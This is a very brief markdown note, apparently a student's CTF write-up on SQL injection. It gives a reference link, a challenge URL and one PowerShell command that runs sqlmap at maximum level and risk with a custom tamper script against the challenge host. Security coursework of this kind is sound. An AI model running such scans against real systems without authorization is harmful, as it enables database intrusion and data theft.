# sql injection - database

- ref 1:
https://www.cnblogs.com/hetianlab/p/16012663.html
- 題目:
http://ctf.adl.tw:12003/

The idea 
```ps
PS D:\1111_work\1111attack_and_defense\sqlmap> py sqlmap.py -u http://ctf.adl.tw:12003/ --level=5 --risk=3  --tamper=my_tamper/my_tamper.py
```